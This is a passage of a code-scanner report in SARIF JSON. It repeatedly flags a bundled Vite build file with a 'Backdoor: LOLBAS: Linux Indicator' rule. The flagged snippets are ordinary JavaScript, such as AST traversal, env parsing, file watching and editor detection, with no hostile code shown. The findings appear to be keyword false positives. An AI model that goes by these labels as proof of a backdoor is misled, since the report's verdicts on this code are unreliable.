                      "text": "      }\n    },\n    leave(node, parent) {\n      if (parent && !(parent.type === \"IfStatement\" && node === parent.alternate)) {\n        parentStack.shift();\n      }\n      if (node.type === \"VariableDeclaration\") {\n",
                      "markdown": "`      }\n    },\n    leave(node, parent) {\n      if (parent && !(parent.type === \"IfStatement\" && node === parent.alternate)) {\n        parentStack.shift();\n      }\n      if (node.type === \"VariableDeclaration\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52543,
                  "startColumn": 54,
                  "endLine": 52543,
                  "endColumn": 60,
                  "snippet": {
                    "text": "      if (node.type === \"ImportDeclaration\") {\n        return this.skip();\n      }\n      if (parent && !(parent.type === \"IfStatement\" && node === parent.alternate)) {\n        parentStack.unshift(parent);\n      }\n      if (node.type === \"VariableDeclaration\") {\n",
                    "rendered": {
                      "text": "      if (node.type === \"ImportDeclaration\") {\n        return this.skip();\n      }\n      if (parent && !(parent.type === \"IfStatement\" && node === parent.alternate)) {\n        parentStack.unshift(parent);\n      }\n      if (node.type === \"VariableDeclaration\") {\n",
                      "markdown": "`      if (node.type === \"ImportDeclaration\") {\n        return this.skip();\n      }\n      if (parent && !(parent.type === \"IfStatement\" && node === parent.alternate)) {\n        parentStack.unshift(parent);\n      }\n      if (node.type === \"VariableDeclaration\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52511,
                  "startColumn": 33,
                  "endLine": 52511,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    scopeIds.add(name);\n  };\n  function isInScope(name, parents) {\n    return parents.some((node) => node && scopeMap.get(node)?.has(name));\n  }\n  function handlePattern(p, parentScope) {\n    if (p.type === \"Identifier\") {\n",
                    "rendered": {
                      "text": "    scopeIds.add(name);\n  };\n  function isInScope(name, parents) {\n    return parents.some((node) => node && scopeMap.get(node)?.has(name));\n  }\n  function handlePattern(p, parentScope) {\n    if (p.type === \"Identifier\") {\n",
                      "markdown": "`    scopeIds.add(name);\n  };\n  function isInScope(name, parents) {\n    return parents.some((node) => node && scopeMap.get(node)?.has(name));\n  }\n  function handlePattern(p, parentScope) {\n    if (p.type === \"Identifier\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52355,
                  "startColumn": 12,
                  "endLine": 52355,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      }\n    }\n  }\n  for (const node of exports) {\n    if (node.type === \"ExportNamedDeclaration\") {\n      if (node.declaration) {\n        if (node.declaration.type === \"FunctionDeclaration\" || node.declaration.type === \"ClassDeclaration\") {\n",
                    "rendered": {
                      "text": "      }\n    }\n  }\n  for (const node of exports) {\n    if (node.type === \"ExportNamedDeclaration\") {\n      if (node.declaration) {\n        if (node.declaration.type === \"FunctionDeclaration\" || node.declaration.type === \"ClassDeclaration\") {\n",
                      "markdown": "`      }\n    }\n  }\n  for (const node of exports) {\n    if (node.type === \"ExportNamedDeclaration\") {\n      if (node.declaration) {\n        if (node.declaration.type === \"FunctionDeclaration\" || node.declaration.type === \"ClassDeclaration\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52322,
                  "startColumn": 12,
                  "endLine": 52322,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      exports.push(node);\n    }\n  }\n  for (const node of imports) {\n    const importId = defineImport(hoistIndex, node.source.value, {\n      importedNames: node.specifiers.map((s2) => {\n        if (s2.type === \"ImportSpecifier\")\n",
                    "rendered": {
                      "text": "      exports.push(node);\n    }\n  }\n  for (const node of imports) {\n    const importId = defineImport(hoistIndex, node.source.value, {\n      importedNames: node.specifiers.map((s2) => {\n        if (s2.type === \"ImportSpecifier\")\n",
                      "markdown": "`      exports.push(node);\n    }\n  }\n  for (const node of imports) {\n    const importId = defineImport(hoistIndex, node.source.value, {\n      importedNames: node.specifiers.map((s2) => {\n        if (s2.type === \"ImportSpecifier\")\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52315,
                  "startColumn": 12,
                  "endLine": 52315,
                  "endColumn": 18,
                  "snippet": {
                    "text": "  }\n  const imports = [];\n  const exports = [];\n  for (const node of ast.body) {\n    if (node.type === \"ImportDeclaration\") {\n      imports.push(node);\n    } else if (node.type === \"ExportNamedDeclaration\" || node.type === \"ExportDefaultDeclaration\" || node.type === \"ExportAllDeclaration\") {\n",
                    "rendered": {
                      "text": "  }\n  const imports = [];\n  const exports = [];\n  for (const node of ast.body) {\n    if (node.type === \"ImportDeclaration\") {\n      imports.push(node);\n    } else if (node.type === \"ExportNamedDeclaration\" || node.type === \"ExportDefaultDeclaration\" || node.type === \"ExportAllDeclaration\") {\n",
                      "markdown": "`  }\n  const imports = [];\n  const exports = [];\n  for (const node of ast.body) {\n    if (node.type === \"ImportDeclaration\") {\n      imports.push(node);\n    } else if (node.type === \"ExportNamedDeclaration\" || node.type === \"ExportDefaultDeclaration\" || node.type === \"ExportAllDeclaration\") {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52198,
                  "startColumn": 4,
                  "endLine": 52198,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\t\t\t\tthis.leave.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n",
                    "rendered": {
                      "text": "\t\t\t\tthis.leave.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n",
                      "markdown": "`\t\t\t\tthis.leave.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 52145,
                  "startColumn": 4,
                  "endLine": 52145,
                  "endColumn": 10,
                  "snippet": {
                    "text": "\t\t\t\tthis.enter.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n",
                    "rendered": {
                      "text": "\t\t\t\tthis.enter.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n",
                      "markdown": "`\t\t\t\tthis.enter.call(this.context, node, parent, prop, index);\n\n\t\t\t\tif (this.replacement) {\n\t\t\t\t\tnode = this.replacement;\n\t\t\t\t\tthis.replace(parent, prop, index, node);\n\t\t\t\t}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 51557,
                  "startColumn": 28,
                  "endLine": 51557,
                  "endColumn": 34,
                  "snippet": {
                    "text": "    const pathname = decodeURI(url.pathname);\n    let redirectedPathname;\n    for (const { find, replacement } of server.config.resolve.alias) {\n      const matches = typeof find === \"string\" ? pathname.startsWith(find) : find.test(pathname);\n      if (matches) {\n        redirectedPathname = pathname.replace(find, replacement);\n        break;\n",
                    "rendered": {
                      "text": "    const pathname = decodeURI(url.pathname);\n    let redirectedPathname;\n    for (const { find, replacement } of server.config.resolve.alias) {\n      const matches = typeof find === \"string\" ? pathname.startsWith(find) : find.test(pathname);\n      if (matches) {\n        redirectedPathname = pathname.replace(find, replacement);\n        break;\n",
                      "markdown": "`    const pathname = decodeURI(url.pathname);\n    let redirectedPathname;\n    for (const { find, replacement } of server.config.resolve.alias) {\n      const matches = typeof find === \"string\" ? pathname.startsWith(find) : find.test(pathname);\n      if (matches) {\n        redirectedPathname = pathname.replace(find, replacement);\n        break;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47369,
                  "startColumn": 11,
                  "endLine": 47369,
                  "endColumn": 20,
                  "snippet": {
                    "text": "      hmrConfig = isObject$1(hmrConfig) ? hmrConfig : void 0;\n      const host = hmrConfig?.host || null;\n      const protocol = hmrConfig?.protocol || null;\n      const timeout = hmrConfig?.timeout || 3e4;\n      const overlay = hmrConfig?.overlay !== false;\n      const isHmrServerSpecified = !!hmrConfig?.server;\n      const hmrConfigName = path$n.basename(config.configFile || \"vite.config.js\");\n",
                    "rendered": {
                      "text": "      hmrConfig = isObject$1(hmrConfig) ? hmrConfig : void 0;\n      const host = hmrConfig?.host || null;\n      const protocol = hmrConfig?.protocol || null;\n      const timeout = hmrConfig?.timeout || 3e4;\n      const overlay = hmrConfig?.overlay !== false;\n      const isHmrServerSpecified = !!hmrConfig?.server;\n      const hmrConfigName = path$n.basename(config.configFile || \"vite.config.js\");\n",
                      "markdown": "`      hmrConfig = isObject$1(hmrConfig) ? hmrConfig : void 0;\n      const host = hmrConfig?.host || null;\n      const protocol = hmrConfig?.protocol || null;\n      const timeout = hmrConfig?.timeout || 3e4;\n      const overlay = hmrConfig?.overlay !== false;\n      const isHmrServerSpecified = !!hmrConfig?.server;\n      const hmrConfigName = path$n.basename(config.configFile || \"vite.config.js\");\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 47001,
                  "startColumn": 18,
                  "endLine": 47001,
                  "endColumn": 24,
                  "snippet": {
                    "text": "      )?.external;\n    } catch (e) {\n      debug$b?.(\n        `Failed to node resolve \"${id}\". Skipping externalizing it by default.`\n      );\n      return false;\n    }\n",
                    "rendered": {
                      "text": "      )?.external;\n    } catch (e) {\n      debug$b?.(\n        `Failed to node resolve \"${id}\". Skipping externalizing it by default.`\n      );\n      return false;\n    }\n",
                      "markdown": "`      )?.external;\n    } catch (e) {\n      debug$b?.(\n        `Failed to node resolve \"${id}\". Skipping externalizing it by default.`\n      );\n      return false;\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 46134,
                  "startColumn": 29,
                  "endLine": 46134,
                  "endColumn": 35,
                  "snippet": {
                    "text": "          } else {\n            if (!asSrc) {\n              debug$c?.(\n                `externalized node built-in \"${id}\" to empty module. (imported by: ${colors$1.white(colors$1.dim(importer))})`\n              );\n            } else if (isProduction) {\n              this.warn(\n",
                    "rendered": {
                      "text": "          } else {\n            if (!asSrc) {\n              debug$c?.(\n                `externalized node built-in \"${id}\" to empty module. (imported by: ${colors$1.white(colors$1.dim(importer))})`\n              );\n            } else if (isProduction) {\n              this.warn(\n",
                      "markdown": "`          } else {\n            if (!asSrc) {\n              debug$c?.(\n                `externalized node built-in \"${id}\" to empty module. (imported by: ${colors$1.white(colors$1.dim(importer))})`\n              );\n            } else if (isProduction) {\n              this.warn(\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45164,
                  "startColumn": 31,
                  "endLine": 45164,
                  "endColumn": 36,
                  "snippet": {
                    "text": "    // Ignore...\n  }\n\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n",
                    "rendered": {
                      "text": "    // Ignore...\n  }\n\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n",
                      "markdown": "`    // Ignore...\n  }\n\n  // Last resort, use old skool env vars\n  if (process.env.VISUAL) {\n    return [process.env.VISUAL]\n  } else if (process.env.EDITOR) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45117,
                  "startColumn": 35,
                  "endLine": 45117,
                  "endColumn": 41,
                  "snippet": {
                    "text": "          if (processName !== COMMON_EDITORS_MACOS[processName]) {\n            return [COMMON_EDITORS_MACOS[processName]]\n          }\n          // Use a partial match to find the running process path.  If one is found, use the\n          // existing path since it can be running from anywhere.\n          const runningProcess = processList.find((procName) => procName.endsWith(processNameWithoutApplications));\n          if (runningProcess !== undefined) {\n",
                    "rendered": {
                      "text": "          if (processName !== COMMON_EDITORS_MACOS[processName]) {\n            return [COMMON_EDITORS_MACOS[processName]]\n          }\n          // Use a partial match to find the running process path.  If one is found, use the\n          // existing path since it can be running from anywhere.\n          const runningProcess = processList.find((procName) => procName.endsWith(processNameWithoutApplications));\n          if (runningProcess !== undefined) {\n",
                      "markdown": "`          if (processName !== COMMON_EDITORS_MACOS[processName]) {\n            return [COMMON_EDITORS_MACOS[processName]]\n          }\n          // Use a partial match to find the running process path.  If one is found, use the\n          // existing path since it can be running from anywhere.\n          const runningProcess = processList.find((procName) => procName.endsWith(processNameWithoutApplications));\n          if (runningProcess !== undefined) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45111,
                  "startColumn": 10,
                  "endLine": 45111,
                  "endColumn": 16,
                  "snippet": {
                    "text": "          return [COMMON_EDITORS_MACOS[processName]]\n        }\n        const processNameWithoutApplications = processName.replace('/Applications', '');\n        // Find editor installation not in /Applications.\n        if (output.indexOf(processNameWithoutApplications) !== -1) {\n          // Use the CLI command if one is specified\n          if (processName !== COMMON_EDITORS_MACOS[processName]) {\n",
                    "rendered": {
                      "text": "          return [COMMON_EDITORS_MACOS[processName]]\n        }\n        const processNameWithoutApplications = processName.replace('/Applications', '');\n        // Find editor installation not in /Applications.\n        if (output.indexOf(processNameWithoutApplications) !== -1) {\n          // Use the CLI command if one is specified\n          if (processName !== COMMON_EDITORS_MACOS[processName]) {\n",
                      "markdown": "`          return [COMMON_EDITORS_MACOS[processName]]\n        }\n        const processNameWithoutApplications = processName.replace('/Applications', '');\n        // Find editor installation not in /Applications.\n        if (output.indexOf(processNameWithoutApplications) !== -1) {\n          // Use the CLI command if one is specified\n          if (processName !== COMMON_EDITORS_MACOS[processName]) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45106,
                  "startColumn": 10,
                  "endLine": 45106,
                  "endColumn": 16,
                  "snippet": {
                    "text": "      const processList = output.split('\\n');\n      for (let i = 0; i < processNames.length; i++) {\n        const processName = processNames[i];\n        // Find editor by exact match.\n        if (processList.includes(processName)) {\n          return [COMMON_EDITORS_MACOS[processName]]\n        }\n",
                    "rendered": {
                      "text": "      const processList = output.split('\\n');\n      for (let i = 0; i < processNames.length; i++) {\n        const processName = processNames[i];\n        // Find editor by exact match.\n        if (processList.includes(processName)) {\n          return [COMMON_EDITORS_MACOS[processName]]\n        }\n",
                      "markdown": "`      const processList = output.split('\\n');\n      for (let i = 0; i < processNames.length; i++) {\n        const processName = processNames[i];\n        // Find editor by exact match.\n        if (processList.includes(processName)) {\n          return [COMMON_EDITORS_MACOS[processName]]\n        }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45092,
                  "startColumn": 11,
                  "endLine": 45092,
                  "endColumn": 17,
                  "snippet": {
                    "text": "    return [process.env.EDITOR || 'code']\n  }\n\n  // We can find out which editor is currently running by:\n  // `ps x` on macOS and Linux\n  // `Get-Process` on Windows\n  try {\n",
                    "rendered": {
                      "text": "    return [process.env.EDITOR || 'code']\n  }\n\n  // We can find out which editor is currently running by:\n  // `ps x` on macOS and Linux\n  // `Get-Process` on Windows\n  try {\n",
                      "markdown": "`    return [process.env.EDITOR || 'code']\n  }\n\n  // We can find out which editor is currently running by:\n  // `ps x` on macOS and Linux\n  // `Get-Process` on Windows\n  try {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 45074,
                  "startColumn": 19,
                  "endLine": 45075,
                  "snippet": {
                    "text": "\n// Map from full process name to binary that starts the process\n// We can't just re-use full process name, because it will spawn a new instance\n// of the app every time\nconst COMMON_EDITORS_MACOS = macos;\nconst COMMON_EDITORS_LINUX = linux;\nconst COMMON_EDITORS_WIN = windows$1;\n\n",
                    "rendered": {
                      "text": "\n// Map from full process name to binary that starts the process\n// We can't just re-use full process name, because it will spawn a new instance\n// of the app every time\nconst COMMON_EDITORS_MACOS = macos;\nconst COMMON_EDITORS_LINUX = linux;\nconst COMMON_EDITORS_WIN = windows$1;\n\n",
                      "markdown": "`\n// Map from full process name to binary that starts the process\n// We can't just re-use full process name, because it will spawn a new instance\n// of the app every time\nconst COMMON_EDITORS_MACOS = macos;\nconst COMMON_EDITORS_LINUX = linux;\nconst COMMON_EDITORS_WIN = windows$1;\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44953,
                  "startColumn": 11,
                  "endLine": 44953,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\nvar parse$6 = function parse(s, env, opts) {\n\tvar mapped = parseInternal(s, env, opts);\n\tif (typeof env !== 'function') {\n\t\treturn mapped;\n\t}\n\treturn mapped.reduce(function (acc, s) {\n",
                    "rendered": {
                      "text": "\nvar parse$6 = function parse(s, env, opts) {\n\tvar mapped = parseInternal(s, env, opts);\n\tif (typeof env !== 'function') {\n\t\treturn mapped;\n\t}\n\treturn mapped.reduce(function (acc, s) {\n",
                      "markdown": "`\nvar parse$6 = function parse(s, env, opts) {\n\tvar mapped = parseInternal(s, env, opts);\n\tif (typeof env !== 'function') {\n\t\treturn mapped;\n\t}\n\treturn mapped.reduce(function (acc, s) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44829,
                  "startColumn": 1,
                  "endLine": 44829,
                  "endColumn": 6,
                  "snippet": {
                    "text": "\t\treturn [];\n\t}\n\tif (!env) {\n\t\tenv = {};\n\t}\n\n\tvar commented = false;\n",
                    "rendered": {
                      "text": "\t\treturn [];\n\t}\n\tif (!env) {\n\t\tenv = {};\n\t}\n\n\tvar commented = false;\n",
                      "markdown": "`\t\treturn [];\n\t}\n\tif (!env) {\n\t\tenv = {};\n\t}\n\n\tvar commented = false;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44798,
                  "startColumn": 15,
                  "endLine": 44798,
                  "endColumn": 20,
                  "snippet": {
                    "text": "}\n\nfunction getVar(env, pre, key) {\n\tvar r = typeof env === 'function' ? env(key) : env[key];\n\tif (typeof r === 'undefined' && key != '') {\n\t\tr = '';\n\t} else if (typeof r === 'undefined') {\n",
                    "rendered": {
                      "text": "}\n\nfunction getVar(env, pre, key) {\n\tvar r = typeof env === 'function' ? env(key) : env[key];\n\tif (typeof r === 'undefined' && key != '') {\n\t\tr = '';\n\t} else if (typeof r === 'undefined') {\n",
                      "markdown": "`}\n\nfunction getVar(env, pre, key) {\n\tvar r = typeof env === 'function' ? env(key) : env[key];\n\tif (typeof r === 'undefined' && key != '') {\n\t\tr = '';\n\t} else if (typeof r === 'undefined') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 44723,
                  "startColumn": 5,
                  "endLine": 44723,
                  "endColumn": 12,
                  "snippet": {
                    "text": " * @param {Object=} options chokidar opts\n * @returns an instance of FSWatcher for chaining.\n */\nconst watch = (paths, options) => {\n  const watcher = new FSWatcher(options);\n  watcher.add(paths);\n  return watcher;\n",
                    "rendered": {
                      "text": " * @param {Object=} options chokidar opts\n * @returns an instance of FSWatcher for chaining.\n */\nconst watch = (paths, options) => {\n  const watcher = new FSWatcher(options);\n  watcher.add(paths);\n  return watcher;\n",
                      "markdown": "` * @param {Object=} options chokidar opts\n * @returns an instance of FSWatcher for chaining.\n */\nconst watch = (paths, options) => {\n  const watcher = new FSWatcher(options);\n  watcher.add(paths);\n  return watcher;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/vite.zip/package/dist/node/chunks/dep-BzOvws4Y.js"
                },
                "region": {
                  "startLine": 43852,
                  "startColumn": 47,
                  "endLine": 43852,
                  "endColumn": 54,
                  "snippet": {
                    "text": "   */\n  const paths = flatten(arrify(paths_));\n  if (!paths.every(p => typeof p === STRING_TYPE)) {\n    throw new TypeError(`Non-string provided as watch path: ${paths}`);\n  }\n  return paths.map(normalizePathToUnix);\n};\n",
                    "rendered": {
                      "text": "   */\n  const paths = flatten(arrify(paths_));\n  if (!paths.every(p => typeof p === STRING_TYPE)) {\n    throw new TypeError(`Non-string provided as watch path: ${paths}`);\n  }\n  return paths.map(normalizePathToUnix);\n};\n",
